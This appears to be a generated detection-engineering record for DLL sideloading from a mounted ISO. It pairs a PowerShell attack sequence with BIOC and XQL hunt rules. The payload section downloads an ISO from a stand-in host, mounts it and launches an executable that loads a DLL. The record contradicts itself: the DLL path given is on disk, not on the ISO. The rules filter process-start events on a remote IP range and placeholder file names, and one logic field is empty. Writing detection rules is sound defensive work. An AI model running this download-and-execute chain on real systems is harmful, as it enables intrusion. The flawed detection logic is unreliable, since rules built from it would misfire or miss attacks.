identity.description: An attacker uses PowerShell to load a malicious DLL from a mounted ISO image, triggering Cortex's detection for uncommon DLL sideloading from CD-ROM devices. The attack involves mounting an ISO, executing a benign-looking process that loads a malicious DLL, and establishing C2 communication.

payload.code:
mkdir C:\temp\iso
wget https://example.com/malicious.iso -O C:\temp\iso\malicious.iso
Mount-DiskImage -ImagePath C:\temp\iso\malicious.iso
$drive = Get-DiskImage -ImagePath C:\temp\iso\malicious.iso | Get-Volume
$exePath = "$($drive.DriveLetter):\malicious.exe"
Start-Process -FilePath $exePath -ArgumentList "-c 'C:\temp\iso\malicious.dll'"

biocs.name: Uncommon DLL Sideloading from ISO
biocs.description: Detects when a process loads a DLL from a logical CD-ROM or ISO device not typically used for such operations
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter causality_actor_process_image_name contains '\malicious.exe'
| filter action_file_path contains 'malicious.dll'
| filter action_remote_ip in [192.0.2.0/24]
| filter actor_process_image_name contains 'powershell.exe'

abiocs.name: Suspicious DLL Load from Mounted ISO
abiocs.description: Behavioral deviation where a process loads a DLL from a mounted ISO drive, which is not typical for legitimate software
abiocs.logic:

abiocs.causality_anchor: powershell.exe loading DLL from mounted ISO

xql_queries.name: Hunt for DLL Sideloading from ISO
xql_queries.query:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter causality_actor_process_image_name contains '\malicious.exe'
| filter action_file_path contains 'malicious.dll'
| filter action_remote_ip in [192.0.2.0/24]
| filter actor_process_image_name contains 'powershell.exe'
| comp count() by actor_process_image_name, action_file_path
